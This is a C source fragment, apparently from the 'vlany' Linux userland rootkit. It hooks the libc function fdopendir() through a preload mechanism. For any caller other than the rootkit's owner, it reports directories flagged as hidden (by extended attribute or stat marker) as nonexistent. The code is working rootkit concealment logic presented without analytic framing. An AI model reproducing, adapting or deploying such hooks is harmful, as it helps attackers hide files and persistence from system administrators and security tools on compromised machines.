DIR *fdopendir(int fd)
{
    #ifdef DEBUG
        printf("[vlany] fdopendir() called\n");
    #endif

    HOOK(old_fdopendir, CFDOPENDIR);

    if(owned()) return old_fdopendir(fd);

    if(hidden_fxattr(fd) || hidden_fxstat(_STAT_VER, fd, 32)) { errno = ENOENT; return NULL; }

    return old_fdopendir(fd);
}
